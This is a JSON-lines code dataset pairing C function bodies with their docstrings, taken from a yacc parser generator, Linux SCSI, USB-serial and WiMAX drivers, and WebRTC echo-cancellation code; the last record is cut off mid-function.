{"docstring": "/* Process %token, %left, %right, %nonassoc */\n", "func_signal": "void do_token(int tag)", "code": "{\n  Symbol *type, *p;\n  int precincr = 0;\n  char t;\n    \n  type = gettype();\n  t = gettoken();\n  while (isgsym(t)) {\n    p = gsym[intern_gsym(token_text, YES)];\n    if (type != NULL)\n      p->type = type;\n    switch (tag) {\n    case LEFT:\n      p->assoc |= A_LEFT;\n      goto setprec;\n      break;\n    case RIGHT:\n      p->assoc |= A_RIGHT;\n      goto setprec;\n    case NONASSOC:\n      p->assoc |= A_NON;\n    setprec:\n      p->prec = cur_prec;\n      precincr = 1;\n      break;\n    }\n    if ((t = gettoken()) == NUMBER) {\n      if (p->value == -1)\n        p->value = atoi(token_text);\n      else\n        error1(\"token %s already has a value\", p->name);\n      t = gettoken();\n    }\n    if (t == ',')\n      t = gettoken();\n  }\n  ungettok();\n  cur_prec += precincr;\n}", "path": "src\\grammar.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Entry point */\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n  char fn[MAXPATHLEN];\n  char *parserfn;\n  char *p;\n\n  char *langname = NULL;\n  bool vflag = NO;\n  bool dflag = NO;\n  char *fnpref = NULL;\n\n  parserfn = getenv(\"KMYACCPAR\");\n\n#ifndef MSDOS\n  progname = *argv;\n#endif /* !MSDOS */\n\n  while (++argv, --argc != 0 && argv[0][0] == '-') {\n    for (p = argv[0] + 1; *p; ) {\n      switch (*p++) {\n      case 'd':\n        dflag = YES;\n        break;\n      case 'x':\n        debug = YES;\n        /* fall thru */\n      case 'v':\n        vflag = YES;\n        break;\n      case 'l':\n        lflag = YES;\n        break;\n      case 't':\n        tflag = YES;\n        break;\n      case 'i':\n        iflag = YES;\n        /* fall thru */\n      case 'n':\n        nflag = YES;\n        break;\n      case 'L':\n        if (*p != '\\0') {\n          langname = p;\n          p = \"\";\n        } else {\n          if (--argc <= 0)\n            goto boo;\n          langname = *++argv;\n        }\n        break;\n      case 'b':\n        if (*p != '\\0') {\n          fnpref = p;\n          p = \"\";\n        } else {\n          if (--argc <= 0)\n            goto boo;\n          fnpref = *++argv;\n        }\n        break;\n      case 'p':\n        if (*p != '\\0') {\n          pspref = p;\n          p = \"\";\n        } else {\n          if (--argc <= 0)\n            goto boo;\n          pspref = *++argv;\n        }\n        break;\n      case 'm':\n        if (*p != '\\0') {\n          parserfn = p;\n          p = \"\";\n        } else {\n          if (--argc <= 0)\n            goto boo;\n          parserfn = *++argv;\n        }\n        break;\n      case 'a':\n        aflag = YES;\n        break;\n      default:\n      boo:\n        usage();\n        exit(1);\n      }\n    }\n  }\n  if (argc != 1) {\n    usage();\n    exit(1);\n  }\n\n  filename = argv[0];\n\n  if (langname)\n    parser_set_language(langname);\n  else\n    parser_set_language_by_yaccext(extension(filename));\n\n  ifp = efopen(filename, \"r\");\n  outfilename = parser_outfilename(fnpref, filename); \n  ofp = efopen(outfilename, \"w\");\n  if (dflag) {\n    char *header = parser_header_filename(fnpref, filename);\n    if (header != NULL)\n      hfp = efopen(header, \"w\");\n  }\n  if (parserfn == NULL)\n    parserfn = parser_modelfilename(PARSERBASE);\n\n  /* Initialize parser generator */\n  parser_create(parserfn, tflag);\n\n  /* Read declaration section */\n  do_declaration();\n\n  /* read grammar */\n  do_grammar();\n\n#if 0\n  fprintf(stderr, \"grammar read. \");\n  show_mem_usage();\n#endif\n\n  if (worst_error == 0) {\n\n    if (vflag)\n      vfp = efopen(strcat(strcpy(fn, fnpref ? fnpref : \"y\"), OUT_SUFFIX), \"w\");\n\n    /* compute LALR(1) states & actions */\n    comp_lalr();\n\n    /* generate parser */\n    parser_generate();\n\n#if 0\n    fprintf(stderr, \"gentable done. \");\n    show_mem_usage();\n#endif\n\n    if (vfp) efclose(vfp);\n\n  }\n\n  parser_close();\n  efclose(ofp);\n\n  exit(worst_error);\n}", "path": "src\\yacc.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Best covering of classes */\n", "func_signal": "int best_covering(short table[], Preimage *prim)", "code": "{\n  int i, j, n, gain;\n\n  for (i = 0; i < nstates; i++)\n    frequency[i] = 0;\n  gain = 0;\n  for (i = 0; i < nterms; i++) {\n    int max = 0;\n    int maxaction = -1;\n    int nvacant = 0;\n    for (j = 0; j < prim->len; j++) {\n      if (class2nd[prim->classes[j]] < 0) {\n        int c = class_action[prim->classes[j]][i];\n        if (c > 0 && ++frequency[c] > max) {\n          maxaction = c;\n          max = frequency[c];\n        } else if (isvacant(c)) {\n          nvacant++;\n        }\n      }\n    }\n    n = max - 1 - nvacant;\n    if (n > 0) {\n      table[i] = maxaction;\n      gain += n;\n    } else\n      table[i] = VACANT;\n  }\n  return gain;\n}", "path": "src\\compress.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Close file fp and exit if error */\n", "func_signal": "global void efclose(FILE *fp)", "code": "{\n  if (ferror(fp) || fclose(fp)) {\n    fprintf(stderr, \"%s: can't close\\n\", progname);\n    exit(1);\n  }\n}", "path": "src\\yacc.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Prototype: void cumanascsi_2_terminator_ctl(host, on_off)\n * Purpose  : Turn the Cumana SCSI 2 terminators on or off\n * Params   : host   - card to turn on/off\n *          : on_off - !0 to turn on, 0 to turn off\n */\n", "func_signal": "static void\ncumanascsi_2_terminator_ctl(struct Scsi_Host *host, int on_off)", "code": "{\n\tstruct cumanascsi2_info *info = (struct cumanascsi2_info *)host->hostdata;\n\n\tif (on_off) {\n\t\tinfo->terms = 1;\n\t\twriteb(ALATCH_ENA_TERM, info->base + CUMANASCSI2_ALATCH);\n\t} else {\n\t\tinfo->terms = 0;\n\t\twriteb(ALATCH_DIS_TERM, info->base + CUMANASCSI2_ALATCH);\n\t}\n}", "path": "drivers\\scsi\\arm\\cumana_2.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* Prototype: const char *cumanascsi_2_info(struct Scsi_Host * host)\n * Purpose  : returns a descriptive string about this interface,\n * Params   : host - driver host structure to return info for.\n * Returns  : pointer to a static buffer containing null terminated string.\n */\n", "func_signal": "const char *cumanascsi_2_info(struct Scsi_Host *host)", "code": "{\n\tstruct cumanascsi2_info *info = (struct cumanascsi2_info *)host->hostdata;\n\tstatic char string[150];\n\n\tsprintf(string, \"%s (%s) in slot %d v%s terminators o%s\",\n\t\thost->hostt->name, info->info.scsi.type, info->ec->slot_no,\n\t\tVERSION, info->terms ? \"n\" : \"ff\");\n\n\treturn string;\n}", "path": "drivers\\scsi\\arm\\cumana_2.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/********************** File Operations END  *****************************/\n", "func_signal": "int thp_wimax_uart_switch(int on)", "code": "{\n    printk(\"%s on%d\\n\", __func__, on);\n\n\tif (on) {\n        mmc_wimax_uart_switch(2); // Wimax\n\t}\n\telse {\n        mmc_wimax_uart_switch(0); // USB\n\t}\n\n\treturn 0;\n}", "path": "drivers\\net\\wimax\\SQN\\thp.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* allocate private data */\n", "func_signal": "static int ch341_attach(struct usb_serial *serial)", "code": "{\n\tstruct ch341_private *priv;\n\tint r;\n\n\tdbg(\"ch341_attach()\");\n\n\t/* private data */\n\tpriv = kzalloc(sizeof(struct ch341_private), GFP_KERNEL);\n\tif (!priv)\n\t\treturn -ENOMEM;\n\n\tspin_lock_init(&priv->lock);\n\tinit_waitqueue_head(&priv->delta_msr_wait);\n\tpriv->baud_rate = DEFAULT_BAUD_RATE;\n\tpriv->line_control = CH341_BIT_RTS | CH341_BIT_DTR;\n\n\tr = ch341_configure(serial->dev, priv);\n\tif (r < 0)\n\t\tgoto error;\n\n\tusb_set_serial_port_data(serial->port[0], priv);\n\treturn 0;\n\nerror:\tkfree(priv);\n\treturn r;\n}", "path": "drivers\\usb\\serial\\ch341.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* Prototype: void cumanascsi_2_intr(irq, *dev_id, *regs)\n * Purpose  : handle interrupts from Cumana SCSI 2 card\n * Params   : irq    - interrupt number\n *\t      dev_id - user-defined (Scsi_Host structure)\n */\n", "func_signal": "static irqreturn_t\ncumanascsi_2_intr(int irq, void *dev_id)", "code": "{\n\tstruct cumanascsi2_info *info = dev_id;\n\n\treturn fas216_intr(&info->info);\n}", "path": "drivers\\scsi\\arm\\cumana_2.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "// Initialization function for THP handler\n", "func_signal": "int  init_thp_handler(struct net_device *dev)", "code": "{\n\tsqn_pr_enter();\n#if THP_DEBUG\n\tprintk(KERN_WARNING \"init_thp_handler +\\n\");\n#endif\n\n\tskb_queue_head_init(&to_sqntool_queue);\n\n\t/* Define type of intercepted packets */\n\trx_packet_type.type = htons(ETH_P_ALL);    /* Intercept all packets */\n\trx_packet_type.dev  = dev;\n\trx_packet_type.func = thp_handler;     /* Network packet handler function */\n\n\t/* Register packet handler */\n\tdev_add_pack(&rx_packet_type);\n\n#if THP_DEBUG\n\tprintk(KERN_WARNING \"init_thp_handler -\\n\");\n#endif\n\tsqn_pr_leave();\n\n\treturn 0;\n}", "path": "drivers\\net\\wimax\\SQN\\thp.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/** PROC_FS Read Functions */\n", "func_signal": "static int ifacename_read(char *page, char **start, off_t off,\n\t\tint count, int *eof, void *data)", "code": "{\n\tint len = 0;\n\n\tsqn_pr_enter();\n#if THP_DEBUG\n\tprintk(KERN_WARNING \"ifacename_read +\\n\");\n#endif\n\n\tif(this_device)\n\t\tlen += sprintf(page, \"%s\\n\",  this_device->name);\n\n\t*eof = 1;\n\n#if THP_DEBUG\n\tprintk(KERN_WARNING \"ifacename_read -\\n\");\n#endif\n\tsqn_pr_leave();\n\n\treturn len;\n}", "path": "drivers\\net\\wimax\\SQN\\thp.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* Prototype: int cumanascsi_2_dma_stop(host, SCpnt)\n * Purpose  : stops DMA/PIO\n * Params   : host  - host\n *\t      SCpnt - command\n */\n", "func_signal": "static void\ncumanascsi_2_dma_stop(struct Scsi_Host *host, struct scsi_pointer *SCp)", "code": "{\n\tstruct cumanascsi2_info *info = (struct cumanascsi2_info *)host->hostdata;\n\tif (info->info.scsi.dma != NO_DMA) {\n\t\twriteb(ALATCH_DIS_DMA, info->base + CUMANASCSI2_ALATCH);\n\t\tdisable_dma(info->info.scsi.dma);\n\t}\n}", "path": "drivers\\scsi\\arm\\cumana_2.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* open this device, set default parameters */\n", "func_signal": "static int ch341_open(struct tty_struct *tty, struct usb_serial_port *port)", "code": "{\n\tstruct usb_serial *serial = port->serial;\n\tstruct ch341_private *priv = usb_get_serial_port_data(serial->port[0]);\n\tint r;\n\n\tdbg(\"ch341_open()\");\n\n\tpriv->baud_rate = DEFAULT_BAUD_RATE;\n\n\tr = ch341_configure(serial->dev, priv);\n\tif (r)\n\t\tgoto out;\n\n\tr = ch341_set_handshake(serial->dev, priv->line_control);\n\tif (r)\n\t\tgoto out;\n\n\tr = ch341_set_baudrate(serial->dev, priv);\n\tif (r)\n\t\tgoto out;\n\n\tdbg(\"%s - submitting interrupt urb\", __func__);\n\tport->interrupt_in_urb->dev = serial->dev;\n\tr = usb_submit_urb(port->interrupt_in_urb, GFP_KERNEL);\n\tif (r) {\n\t\tdev_err(&port->dev, \"%s - failed submitting interrupt urb,\"\n\t\t\t\" error %d\\n\", __func__, r);\n\t\tch341_close(port);\n\t\treturn -EPROTO;\n\t}\n\n\tr = usb_serial_generic_open(tty, port);\n\nout:\treturn r;\n}", "path": "drivers\\usb\\serial\\ch341.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* Prototype: void cumanascsi_2_irqenable(ec, irqnr)\n * Purpose  : Enable interrupts on Cumana SCSI 2 card\n * Params   : ec    - expansion card structure\n *          : irqnr - interrupt number\n */\n", "func_signal": "static void\ncumanascsi_2_irqenable(struct expansion_card *ec, int irqnr)", "code": "{\n\tstruct cumanascsi2_info *info = ec->irq_data;\n\twriteb(ALATCH_ENA_INT, info->base + CUMANASCSI2_ALATCH);\n}", "path": "drivers\\scsi\\arm\\cumana_2.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* -------------------------------------------------------------------------- */\n", "func_signal": "static int ch341_configure(struct usb_device *dev, struct ch341_private *priv)", "code": "{\n\tchar *buffer;\n\tint r;\n\tconst unsigned size = 8;\n\n\tdbg(\"ch341_configure()\");\n\n\tbuffer = kmalloc(size, GFP_KERNEL);\n\tif (!buffer)\n\t\treturn -ENOMEM;\n\n\t/* expect two bytes 0x27 0x00 */\n\tr = ch341_control_in(dev, 0x5f, 0, 0, buffer, size);\n\tif (r < 0)\n\t\tgoto out;\n\n\tr = ch341_control_out(dev, 0xa1, 0, 0);\n\tif (r < 0)\n\t\tgoto out;\n\n\tr = ch341_set_baudrate(dev, priv);\n\tif (r < 0)\n\t\tgoto out;\n\n\t/* expect two bytes 0x56 0x00 */\n\tr = ch341_control_in(dev, 0x95, 0x2518, 0, buffer, size);\n\tif (r < 0)\n\t\tgoto out;\n\n\tr = ch341_control_out(dev, 0x9a, 0x2518, 0x0050);\n\tif (r < 0)\n\t\tgoto out;\n\n\t/* expect 0xff 0xee */\n\tr = ch341_get_status(dev, priv);\n\tif (r < 0)\n\t\tgoto out;\n\n\tr = ch341_control_out(dev, 0xa1, 0x501f, 0xd90a);\n\tif (r < 0)\n\t\tgoto out;\n\n\tr = ch341_set_baudrate(dev, priv);\n\tif (r < 0)\n\t\tgoto out;\n\n\tr = ch341_set_handshake(dev, priv->line_control);\n\tif (r < 0)\n\t\tgoto out;\n\n\t/* expect 0x9f 0xee */\n\tr = ch341_get_status(dev, priv);\n\nout:\tkfree(buffer);\n\treturn r;\n}", "path": "drivers\\usb\\serial\\ch341.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* Prototype: int cumanascsi_2_set_proc_info(struct Scsi_Host *host, char *buffer, int length)\n * Purpose  : Set a driver specific function\n * Params   : host   - host to setup\n *          : buffer - buffer containing string describing operation\n *          : length - length of string\n * Returns  : -EINVAL, or 0\n */\n", "func_signal": "static int\ncumanascsi_2_set_proc_info(struct Scsi_Host *host, char *buffer, int length)", "code": "{\n\tint ret = length;\n\n\tif (length >= 11 && strncmp(buffer, \"CUMANASCSI2\", 11) == 0) {\n\t\tbuffer += 11;\n\t\tlength -= 11;\n\n\t\tif (length >= 5 && strncmp(buffer, \"term=\", 5) == 0) {\n\t\t\tif (buffer[5] == '1')\n\t\t\t\tcumanascsi_2_terminator_ctl(host, 1);\n\t\t\telse if (buffer[5] == '0')\n\t\t\t\tcumanascsi_2_terminator_ctl(host, 0);\n\t\t\telse\n\t\t\t\tret = -EINVAL;\n\t\t} else\n\t\t\tret = -EINVAL;\n\t} else\n\t\tret = -EINVAL;\n\n\treturn ret;\n}", "path": "drivers\\scsi\\arm\\cumana_2.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/*static int ch341_ioctl(struct usb_serial_port *port, struct file *file,*/\n", "func_signal": "static int ch341_ioctl(struct tty_struct *tty, struct file *file,\n\t\t\tunsigned int cmd, unsigned long arg)", "code": "{\n\tstruct usb_serial_port *port = tty->driver_data;\n\tdbg(\"%s (%d) cmd = 0x%04x\", __func__, port->number, cmd);\n\n\tswitch (cmd) {\n\tcase TIOCMIWAIT:\n\t\tdbg(\"%s (%d) TIOCMIWAIT\", __func__,  port->number);\n\t\treturn wait_modem_info(port, arg);\n\n\tdefault:\n\t\tdbg(\"%s not supported = 0x%04x\", __func__, cmd);\n\t\tbreak;\n\t}\n\n\treturn -ENOIOCTLCMD;\n}", "path": "drivers\\usb\\serial\\ch341.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* Prototype: fasdmatype_t cumanascsi_2_dma_setup(host, SCpnt, direction, min_type)\n * Purpose  : initialises DMA/PIO\n * Params   : host      - host\n *\t      SCpnt     - command\n *\t      direction - DMA on to/off of card\n *\t      min_type  - minimum DMA support that we must have for this transfer\n * Returns  : type of transfer to be performed\n */\n", "func_signal": "static fasdmatype_t\ncumanascsi_2_dma_setup(struct Scsi_Host *host, struct scsi_pointer *SCp,\n\t\t       fasdmadir_t direction, fasdmatype_t min_type)", "code": "{\n\tstruct cumanascsi2_info *info = (struct cumanascsi2_info *)host->hostdata;\n\tstruct device *dev = scsi_get_device(host);\n\tint dmach = info->info.scsi.dma;\n\n\twriteb(ALATCH_DIS_DMA, info->base + CUMANASCSI2_ALATCH);\n\n\tif (dmach != NO_DMA &&\n\t    (min_type == fasdma_real_all || SCp->this_residual >= 512)) {\n\t\tint bufs, map_dir, dma_dir, alatch_dir;\n\n\t\tbufs = copy_SCp_to_sg(&info->sg[0], SCp, NR_SG);\n\n\t\tif (direction == DMA_OUT)\n\t\t\tmap_dir = DMA_TO_DEVICE,\n\t\t\tdma_dir = DMA_MODE_WRITE,\n\t\t\talatch_dir = ALATCH_DMA_OUT;\n\t\telse\n\t\t\tmap_dir = DMA_FROM_DEVICE,\n\t\t\tdma_dir = DMA_MODE_READ,\n\t\t\talatch_dir = ALATCH_DMA_IN;\n\n\t\tdma_map_sg(dev, info->sg, bufs, map_dir);\n\n\t\tdisable_dma(dmach);\n\t\tset_dma_sg(dmach, info->sg, bufs);\n\t\twriteb(alatch_dir, info->base + CUMANASCSI2_ALATCH);\n\t\tset_dma_mode(dmach, dma_dir);\n\t\tenable_dma(dmach);\n\t\twriteb(ALATCH_ENA_DMA, info->base + CUMANASCSI2_ALATCH);\n\t\twriteb(ALATCH_DIS_BIT32, info->base + CUMANASCSI2_ALATCH);\n\t\treturn fasdma_real_all;\n\t}\n\n\t/*\n\t * If we're not doing DMA,\n\t *  we'll do pseudo DMA\n\t */\n\treturn fasdma_pio;\n}", "path": "drivers\\scsi\\arm\\cumana_2.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/**\n  \\brief dev-fs cleanup function\n\n *   This function is called in module cleanup function\n */\n", "func_signal": "void cleanup_thp_devfile(void)", "code": "{\n\tsqn_pr_enter();\n#if THP_DEBUG\n\tprintk(KERN_WARNING \"cleanup_thp_devfile +\\n\");\n#endif\n\n\t/* Unregister entry from /dev */\n\tdevice_destroy(thp_class, dev_num);\n\tclass_destroy(thp_class);\n\tunregister_chrdev_region(dev_num, 1);\n\tcdev_del(thp_dev);\n\n#if THP_DEBUG\n\tprintk(KERN_WARNING \"cleanup_thp_devfile -\\n\");\n#endif\n\tsqn_pr_leave();\n}", "path": "drivers\\net\\wimax\\SQN\\thp.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* Prototype: int cumanascsi_2_proc_info(char *buffer, char **start, off_t offset,\n *\t\t\t\t\t int length, int host_no, int inout)\n * Purpose  : Return information about the driver to a user process accessing\n *\t      the /proc filesystem.\n * Params   : buffer - a buffer to write information to\n *\t      start  - a pointer into this buffer set by this routine to the start\n *\t\t       of the required information.\n *\t      offset - offset into information that we have read upto.\n *\t      length - length of buffer\n *\t      host_no - host number to return information for\n *\t      inout  - 0 for reading, 1 for writing.\n * Returns  : length of data written to buffer.\n */\n", "func_signal": "int cumanascsi_2_proc_info (struct Scsi_Host *host, char *buffer, char **start, off_t offset,\n\t\t\t    int length, int inout)", "code": "{\n\tstruct cumanascsi2_info *info;\n\tchar *p = buffer;\n\tint pos;\n\n\tif (inout == 1)\n\t\treturn cumanascsi_2_set_proc_info(host, buffer, length);\n\n\tinfo = (struct cumanascsi2_info *)host->hostdata;\n\n\tp += sprintf(p, \"Cumana SCSI II driver v%s\\n\", VERSION);\n\tp += fas216_print_host(&info->info, p);\n\tp += sprintf(p, \"Term    : o%s\\n\",\n\t\t\tinfo->terms ? \"n\" : \"ff\");\n\n\tp += fas216_print_stats(&info->info, p);\n\tp += fas216_print_devices(&info->info, p);\n\n\t*start = buffer + offset;\n\tpos = p - buffer - offset;\n\tif (pos > length)\n\t\tpos = length;\n\n\treturn pos;\n}", "path": "drivers\\scsi\\arm\\cumana_2.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "// Clean up function for THP handler\n", "func_signal": "void cleanup_thp_handler(void)", "code": "{\n\tsqn_pr_enter();\n#if THP_DEBUG\n\tprintk(KERN_WARNING \"cleanup_thp_handler +\\n\");\n#endif\n\n\t/* unregister packet handler */\n\tdev_remove_pack(&rx_packet_type);\n\n\tif(!skb_queue_empty(&to_sqntool_queue))\n\t\tskb_queue_purge(&to_sqntool_queue) ;\n\n#if THP_DEBUG\n\tprintk(KERN_WARNING \"cleanup_thp_handler -\\n\");\n#endif\n\tsqn_pr_leave();\n}", "path": "drivers\\net\\wimax\\SQN\\thp.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/*\n * Prototype: void cumanascsi_2_dma_pseudo(host, SCpnt, direction, transfer)\n * Purpose  : handles pseudo DMA\n * Params   : host      - host\n *\t      SCpnt     - command\n *\t      direction - DMA on to/off of card\n *\t      transfer  - minimum number of bytes we expect to transfer\n */\n", "func_signal": "static void\ncumanascsi_2_dma_pseudo(struct Scsi_Host *host, struct scsi_pointer *SCp,\n\t\t\tfasdmadir_t direction, int transfer)", "code": "{\n\tstruct cumanascsi2_info *info = (struct cumanascsi2_info *)host->hostdata;\n\tunsigned int length;\n\tunsigned char *addr;\n\n\tlength = SCp->this_residual;\n\taddr = SCp->ptr;\n\n\tif (direction == DMA_OUT)\n#if 0\n\t\twhile (length > 1) {\n\t\t\tunsigned long word;\n\t\t\tunsigned int status = readb(info->base + CUMANASCSI2_STATUS);\n\n\t\t\tif (status & STATUS_INT)\n\t\t\t\tgoto end;\n\n\t\t\tif (!(status & STATUS_DRQ))\n\t\t\t\tcontinue;\n\n\t\t\tword = *addr | *(addr + 1) << 8;\n\t\t\twritew(word, info->base + CUMANASCSI2_PSEUDODMA);\n\t\t\taddr += 2;\n\t\t\tlength -= 2;\n\t\t}\n#else\n\t\tprintk (\"PSEUDO_OUT???\\n\");\n#endif\n\telse {\n\t\tif (transfer && (transfer & 255)) {\n\t\t\twhile (length >= 256) {\n\t\t\t\tunsigned int status = readb(info->base + CUMANASCSI2_STATUS);\n\n\t\t\t\tif (status & STATUS_INT)\n\t\t\t\t\treturn;\n\t    \n\t\t\t\tif (!(status & STATUS_DRQ))\n\t\t\t\t\tcontinue;\n\n\t\t\t\treadsw(info->base + CUMANASCSI2_PSEUDODMA,\n\t\t\t\t       addr, 256 >> 1);\n\t\t\t\taddr += 256;\n\t\t\t\tlength -= 256;\n\t\t\t}\n\t\t}\n\n\t\twhile (length > 0) {\n\t\t\tunsigned long word;\n\t\t\tunsigned int status = readb(info->base + CUMANASCSI2_STATUS);\n\n\t\t\tif (status & STATUS_INT)\n\t\t\t\treturn;\n\n\t\t\tif (!(status & STATUS_DRQ))\n\t\t\t\tcontinue;\n\n\t\t\tword = readw(info->base + CUMANASCSI2_PSEUDODMA);\n\t\t\t*addr++ = word;\n\t\t\tif (--length > 0) {\n\t\t\t\t*addr++ = word >> 8;\n\t\t\t\tlength --;\n\t\t\t}\n\t\t}\n\t}\n}", "path": "drivers\\scsi\\arm\\cumana_2.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* Prototype: void cumanascsi_2_irqdisable(ec, irqnr)\n * Purpose  : Disable interrupts on Cumana SCSI 2 card\n * Params   : ec    - expansion card structure\n *          : irqnr - interrupt number\n */\n", "func_signal": "static void\ncumanascsi_2_irqdisable(struct expansion_card *ec, int irqnr)", "code": "{\n\tstruct cumanascsi2_info *info = ec->irq_data;\n\twriteb(ALATCH_DIS_INT, info->base + CUMANASCSI2_ALATCH);\n}", "path": "drivers\\scsi\\arm\\cumana_2.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "/* Old_termios contains the original termios settings and\n * tty->termios contains the new setting to be used.\n */\n", "func_signal": "static void ch341_set_termios(struct tty_struct *tty,\n\t\tstruct usb_serial_port *port, struct ktermios *old_termios)", "code": "{\n\tstruct ch341_private *priv = usb_get_serial_port_data(port);\n\tunsigned baud_rate;\n\tunsigned long flags;\n\n\tdbg(\"ch341_set_termios()\");\n\n\tbaud_rate = tty_get_baud_rate(tty);\n\n\tpriv->baud_rate = baud_rate;\n\n\tif (baud_rate) {\n\t\tspin_lock_irqsave(&priv->lock, flags);\n\t\tpriv->line_control |= (CH341_BIT_DTR | CH341_BIT_RTS);\n\t\tspin_unlock_irqrestore(&priv->lock, flags);\n\t\tch341_set_baudrate(port->serial->dev, priv);\n\t} else {\n\t\tspin_lock_irqsave(&priv->lock, flags);\n\t\tpriv->line_control &= ~(CH341_BIT_DTR | CH341_BIT_RTS);\n\t\tspin_unlock_irqrestore(&priv->lock, flags);\n\t}\n\n\tch341_set_handshake(port->serial->dev, priv->line_control);\n\n\t/* Unimplemented:\n\t * (cflag & CSIZE) : data bits [5, 8]\n\t * (cflag & PARENB) : parity {NONE, EVEN, ODD}\n\t * (cflag & CSTOPB) : stop bits [1, 2]\n\t */\n}", "path": "drivers\\usb\\serial\\ch341.c", "repo_name": "LorDClockaN/LorDmodUE", "stars": 34, "license": "other", "language": "c", "size": 108600}
{"docstring": "// complex valued signal, absolute value and sum of absolute values.\n//\n// time_signal          [in]    Pointer to time domain signal\n// freq_signal_real     [out]   Pointer to real part of frequency domain array\n// freq_signal_imag     [out]   Pointer to imaginary part of frequency domain\n//                              array\n// freq_signal_abs      [out]   Pointer to absolute value of frequency domain\n//                              array\n// freq_signal_sum_abs  [out]   Pointer to the sum of all absolute values in\n//                              the frequency domain array\n// return value                 The Q-domain of current frequency values\n//\n", "func_signal": "static int TimeToFrequencyDomain(AecmCore_t* aecm,\n                                 const int16_t* time_signal,\n                                 complex16_t* freq_signal,\n                                 uint16_t* freq_signal_abs,\n                                 uint32_t* freq_signal_sum_abs)", "code": "{\n    int i = 0;\n    int time_signal_scaling = 0;\n\n    int32_t tmp32no1 = 0;\n    int32_t tmp32no2 = 0;\n\n    // In fft_buf, +16 for 32-byte alignment.\n    int16_t fft_buf[PART_LEN4 + 16];\n    int16_t *fft = (int16_t *) (((uintptr_t) fft_buf + 31) & ~31);\n\n    int16_t tmp16no1;\n#ifndef WEBRTC_ARCH_ARM_V7\n    int16_t tmp16no2;\n#endif\n#ifdef AECM_WITH_ABS_APPROX\n    int16_t max_value = 0;\n    int16_t min_value = 0;\n    uint16_t alpha = 0;\n    uint16_t beta = 0;\n#endif\n\n#ifdef AECM_DYNAMIC_Q\n    tmp16no1 = WebRtcSpl_MaxAbsValueW16(time_signal, PART_LEN2);\n    time_signal_scaling = WebRtcSpl_NormW16(tmp16no1);\n#endif\n\n    WindowAndFFT(aecm, fft, time_signal, freq_signal, time_signal_scaling);\n\n    // Extract imaginary and real part, calculate the magnitude for all frequency bins\n    freq_signal[0].imag = 0;\n    freq_signal[PART_LEN].imag = 0;\n    freq_signal_abs[0] = (uint16_t)WEBRTC_SPL_ABS_W16(\n        freq_signal[0].real);\n    freq_signal_abs[PART_LEN] = (uint16_t)WEBRTC_SPL_ABS_W16(\n        freq_signal[PART_LEN].real);\n    (*freq_signal_sum_abs) = (uint32_t)(freq_signal_abs[0]) +\n        (uint32_t)(freq_signal_abs[PART_LEN]);\n\n    for (i = 1; i < PART_LEN; i++)\n    {\n        if (freq_signal[i].real == 0)\n        {\n            freq_signal_abs[i] = (uint16_t)WEBRTC_SPL_ABS_W16(\n                freq_signal[i].imag);\n        }\n        else if (freq_signal[i].imag == 0)\n        {\n            freq_signal_abs[i] = (uint16_t)WEBRTC_SPL_ABS_W16(\n                freq_signal[i].real);\n        }\n        else\n        {\n            // Approximation for magnitude of complex fft output\n            // magn = sqrt(real^2 + imag^2)\n            // magn ~= alpha * max(|imag|,|real|) + beta * min(|imag|,|real|)\n            //\n            // The parameters alpha and beta are stored in Q15\n\n#ifdef AECM_WITH_ABS_APPROX\n            tmp16no1 = WEBRTC_SPL_ABS_W16(freq_signal[i].real);\n            tmp16no2 = WEBRTC_SPL_ABS_W16(freq_signal[i].imag);\n\n            if(tmp16no1 > tmp16no2)\n            {\n                max_value = tmp16no1;\n                min_value = tmp16no2;\n            } else\n            {\n                max_value = tmp16no2;\n                min_value = tmp16no1;\n            }\n\n            // Magnitude in Q(-6)\n            if ((max_value >> 2) > min_value)\n            {\n                alpha = kAlpha1;\n                beta = kBeta1;\n            } else if ((max_value >> 1) > min_value)\n            {\n                alpha = 